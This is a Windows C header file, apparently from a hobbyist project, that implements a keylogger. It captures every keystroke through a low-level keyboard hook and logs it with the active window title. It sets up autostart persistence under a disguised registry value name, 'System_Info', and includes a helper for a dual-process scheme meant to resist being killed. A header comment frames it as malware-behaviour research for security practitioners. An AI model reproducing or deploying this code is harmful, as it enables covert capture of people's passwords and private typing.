#pragma once

#include<Windows.h>
#include<TlHelp32.h>
#include<string.h>
#include<stdio.h>

#define KM_CLEAR(k) (memset(&k,0,sizeof(k)))
#define PKM_CLEAR(pk) (memset(pk,0,sizeof(pk)))

/*
*Author:Pluviophile
*Date: 2020.7.22
*
*一个双进程自保护的键盘监控程序，可以一定程度上防止
*进程被kill在自己电脑上运行注意将代码自保护的部分注释
*否则子昂要退出进程只能先将注册表中开机自启设置关掉再重启
*，另外还没有设计socket传输记录日志文件的功能，此程序为我
*个人进行恶意程序行为分析研究使用，也仅供安全从业人员研究使用
*，不得用于非法用途！
*/

//全局唯一的函数指针，此指针非线程安全
void(_stdcall *CallbackFun)(
	_In_ const char* Key_code,
	_In_ const char* Title
);


//获取当前活动窗口标题
int GetCurrentWindowTitle
(
	_Inout_ char* title2
)
{
	char title1[MAX_PATH];

	HWND N = GetForegroundWindow();
	GetWindowText(N, (LPSTR)title1, MAX_PATH);

	if (lstrcmp((LPCSTR)title1, (LPCSTR)title2) != 0)
	{
		int l = strlen(title1);
		memcpy(title2, title1, l);
		title2[l] = '\0';
		return 1;
	}
	return 0;
}



//键盘钩子回调函数
LRESULT CALLBACK KeyMonitorProc
(
	_In_ int nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	char title[MAX_PATH];
	GetCurrentWindowTitle(title);

	KBDLLHOOKSTRUCT *k =
		(KBDLLHOOKSTRUCT*)lParam;
	if ((k->flags == 128) || (k->flags == 129))
	{
		switch (k->vkCode)

		{
		case 0x30:case 0x60:
			CallbackFun("0", title);
			break;
		case 0x31:case 0x61:
			CallbackFun("1", title);
			break;
		case 0x32:case 0x62:
			CallbackFun("2", title);
			break;
		case 0x33:case 0x63:
			CallbackFun("3", title);
			break;
		case 0x34:case 0x64:
			CallbackFun("4", title);
			break;
		case 0x35:case 0x65:
			CallbackFun("5", title);
			break;
		case 0x36:case 0x66:
			CallbackFun("6", title);
			break;
		case 0x37:case 0x67:
			CallbackFun("7", title);
			break;
		case 0x38:case 0x68:
			CallbackFun("8", title);
			break;
		case 0x39:case 0x69:
			CallbackFun("9", title);
			break;
		case 0x41:
			CallbackFun("A", title);
			break;
		case 0x42:
			CallbackFun("B", title);
			break;
		case 0x43:
			CallbackFun("C", title);
			break;
		case 0x44:
			CallbackFun("D", title);
			break;
		case 0x45:
			CallbackFun("E", title);
			break;
		case 0x46:
			CallbackFun("F", title);
			break;
		case 0x47:
			CallbackFun("G", title);
			break;
		case 0x48:
			CallbackFun("H", title);
			break;
		case 0x49:
			CallbackFun("I", title);
			break;
		case 0x4A:
			CallbackFun("J", title);
			break;
		case 0x4B:
			CallbackFun("K", title);
			break;
		case 0x4C:
			CallbackFun("L", title);
			break;
		case 0x4D:
			CallbackFun("M", title);
			break;
		case 0x4E:
			CallbackFun("N", title);
			break;
		case 0x4F:
			CallbackFun("O", title);
			break;
		case 0x50:
			CallbackFun("P", title);
			break;
		case 0x51:
			CallbackFun("Q", title);
			break;
		case 0x52:
			CallbackFun("R", title);
			break;
		case 0x53:
			CallbackFun("S", title);
			break;
		case 0x54:
			CallbackFun("T", title);
			break;
		case 0x55:
			CallbackFun("U", title);
			break;
		case 0x56:
			CallbackFun("V", title);
			break;
		case 0x57:
			CallbackFun("W", title);
			break;
		case 0x58:
			CallbackFun("X", title);
			break;
		case 0x59:
			CallbackFun("Y", title);
			break;
		case 0x5A:
			CallbackFun("Z", title);
			break;
		case 0x08:
			CallbackFun("backspace", title);
			break;
		case 0x09:
			CallbackFun("tab", title);
			break;
		case 0x0c:
			CallbackFun("clear", title);
			break;
		case 0x0d:
			CallbackFun("enter", title);
			break;
		case 0xA0:
			CallbackFun("Lshift", title);
			break;
		case 0xA1:
			CallbackFun("Rshift", title);
			break;
		case 0xA2:
			CallbackFun("Lctrl", title);
			break;
		case 0xA3:
			CallbackFun("Rctrl", title);
			break;
		case 0xA4:
			CallbackFun("Lalt", title);
			break;
		case 0xA5:
			CallbackFun("Ralt", title);
			break;
		case 0x6B:
			CallbackFun("+", title);
			break;
		case 0x6F:
			CallbackFun("/", title);
			break;
		case 0x6D:
			CallbackFun("-", title);
			break;
		case 0x5B:
			CallbackFun("Lwin", title);
			break;
		case 0x5C:
			CallbackFun("Rwin", title);
			break;
		case 0x5D:
			CallbackFun("APP", title);
			break;
		case 0x12:
			CallbackFun("alt", title);
			break;
		case 0x13:
			CallbackFun("pause", title);
			break;
		case 0x14:
			CallbackFun("capslock", title);
			break;
		case 0x1b:
			CallbackFun("esc", title);
			break;
		case 0x20:
			CallbackFun("spacebar", title);
			break;
		case 0x21:
			CallbackFun("pageup", title);
			break;
		case 0x22:
			CallbackFun("pagedown", title);
			break;
		case 0x23:
			CallbackFun("end", title);
			break;
		case 0x24:
			CallbackFun("home", title);
			break;
		case 0x25:
			CallbackFun("left", title);
			break;
		case 0x26:
			CallbackFun("up", title);
			break;
		case 0x27:
			CallbackFun("right", title);
			break;
		case 0x28:
			CallbackFun("down", title);
			break;
		case 0x29:
			CallbackFun("select", title);
			break;
		case 0x2a:
			CallbackFun("print", title);
			break;
		case 0x2b:
			CallbackFun("execute", title);
			break;
		case 0x2c:
			CallbackFun("prtsc", title);
			break;
		case 0x2d:
			CallbackFun("insert", title);
			break;
		case 0x2e:
			CallbackFun("delete", title);
			break;
		case 0x2f:
			CallbackFun("help", title);
			break;
		case 0x6a:
			CallbackFun("multiply", title);
			break;
		case 0xB0:
			CallbackFun("NEXT", title);
			break;
		case 0xB1:
			CallbackFun("PREVIOUS", title);
			break;
		case 0xB2:
			CallbackFun("stop", title);
			break;
		case 0xB3:
			CallbackFun("PLAY/PAUSE", title);
			break;
		case 0xBA:
			CallbackFun("：/；", title);
			break;
		case 0xBB:
			CallbackFun("+/=", title);
			break;
		case 0xBC:
			CallbackFun(",/>", title);
			break;
		case 0xBD:
			CallbackFun("-/_", title);
			break;
		case 0xBE:
			CallbackFun("./>", title);
			break;
		case 0xBF:
			CallbackFun("/?", title);
			break;
		case 0xC0:
			CallbackFun("~/`", title);
			break;
		case 0xDB:
			CallbackFun("[/{", title);
			break;
		case 0xDC:
			CallbackFun("|/\\", title);
			break;
		case 0xDD:
			CallbackFun("]/}", title);
			break;
		case 0xDE:
			CallbackFun("'/\"", title);
			break;
		case 0x90:
			CallbackFun("NumLock", title);
			break;
		case 0x91:
			CallbackFun("ScrollLock", title);
			break;
		case 0x70:
			CallbackFun("F1", title);
			break;
		case 0x71:
			CallbackFun("F2", title);
			break;
		case 0x72:
			CallbackFun("F3", title);
			break;
		case 0x73:
			CallbackFun("F4", title);
			break;
		case 0x74:
			CallbackFun("F5", title);
			break;
		case 0x75:
			CallbackFun("F6", title);
			break;
		case 0x76:
			CallbackFun("F7", title);
			break;
		case 0x77:
			CallbackFun("F8", title);
			break;
		case 0x78:
			CallbackFun("F9", title);
			break;
		case 0x79:
			CallbackFun("F10", title);
			break;
		case 0x7A:
			CallbackFun("F11", title);
			break;
		case 0x7B:
			CallbackFun("F12", title);
			break;
		case 0x7C:
			CallbackFun("F13", title);
			break;
		case 0x7D:
			CallbackFun("F14", title);
			break;
		case 0x7E:
			CallbackFun("F15", title);
			break;
		case 0x7F:
			CallbackFun("F16", title);
			break;
		case 0x80:
			CallbackFun("F17", title);
			break;
		case 0x81:
			CallbackFun("F18", title);
			break;
		case 0x82:
			CallbackFun("F19", title);
			break;
		case 0x83:
			CallbackFun("F20", title);
			break;
		case 0x84:
			CallbackFun("F21", title);
			break;
		case 0x85:
			CallbackFun("F22", title);
			break;
		case 0x86:
			CallbackFun("F23", title);
			break;
		case 0x87:
			CallbackFun("F24", title);
			break;
		default:
			break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

//初始化，为解决loop使用异步调用机制
int InitializeKeyMonitor(_In_ void(_stdcall *CF)(
	_In_ const char* Key_code,
	_In_ const char* Title
	),
	_Inout_ HHOOK* h
)
{
	CallbackFun = CF;
	MSG msg;
	HHOOK hhk = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		KeyMonitorProc,
		GetModuleHandle(NULL),
		NULL
	);

	if (!hhk)
		return 0;
	h = &hhk;
	while (1)
	{
		if (PeekMessageA(
			&msg,
			NULL,
			NULL,
			NULL,
			PM_REMOVE
		))
		{
			TranslateMessage(&msg);
			DispatchMessageW(&msg);
		}
		Sleep(1);
	}
	return 0;
}

//卸载hook
void UnKeyMonitor(_In_ HHOOK h)
{
	UnhookWindowsHookEx(h);
}

//获取程式存储路径
int GetAppCurrentPath
(
	_Inout_ char* path
)
{
	char exefile[MAX_PATH];
	GetModuleFileName(NULL, (LPSTR)exefile, MAX_PATH);
	int len = strlen(exefile);
	memcpy(path, exefile, (len + 1));
	return len;
}

//获取文件名称
int GetApplicationName
(
	_In_ char* exe_name
)
{
	int index = 0;
	char name[MAX_PATH];
	int len = GetAppCurrentPath(name);
	for (int i = 0; i < len; i++)
	{
		if (name[i] == '\\')
			index = i;
	}
	int begin = index + 1;
	int siz = (len + 1) - begin;
	memcpy(exe_name, name + (index + 1), siz);
	return strlen(exe_name);
}

//获取程式所在目录
int GetAppCurrentDir
(
	_In_ char* path
)
{
	char dir[MAX_PATH];
	int index = 0;
	int len = GetAppCurrentPath(dir);
	for (int i = 0; i < len; i++)
	{
		if (dir[i] == '\\')
			index = i;
	}
	int num = index + 1;
	dir[num] = '\0';
	memcpy(path, dir, num+1);
	return num;
}

//写入注册表,设定开机自启
int WriteRegedit
(
	_In_ const	char* reg_path,
	_In_ const char* value
)
{
	HKEY hKey;
	DWORD dw = REG_OPENED_EXISTING_KEY;
	long ret = RegCreateKeyEx(
		HKEY_LOCAL_MACHINE,
		(LPCSTR)reg_path,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_SET_VALUE,
		NULL,
		&hKey,
		&dw
	);

	if (ret != ERROR_SUCCESS)
	{
		printf("%ld\n",ret);
	}

	ret = RegSetValueEx(
		hKey,
		(LPCSTR)"System_Info",
		0,
		REG_SZ,
		(BYTE*)value,
		(DWORD)strlen(value
		
		)
	);

	if(ret != ERROR_SUCCESS)
	{
		printf("Y %ld\n", ret);
	}
	RegCloseKey(hKey);
	return 0;
}

int CreateNewProcess
(
	_In_ char* DIR_PATH
)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	BOOL P = CreateProcess
	(
		LPCSTR(DIR_PATH),
		NULL,
		NULL,
		NULL,
		false,
		CREATE_NEW_CONSOLE|CREATE_NEW_PROCESS_GROUP,
		NULL,
		NULL,
		&si,
		&pi
	);

	if (!P)
		return -1;

	return 0;
}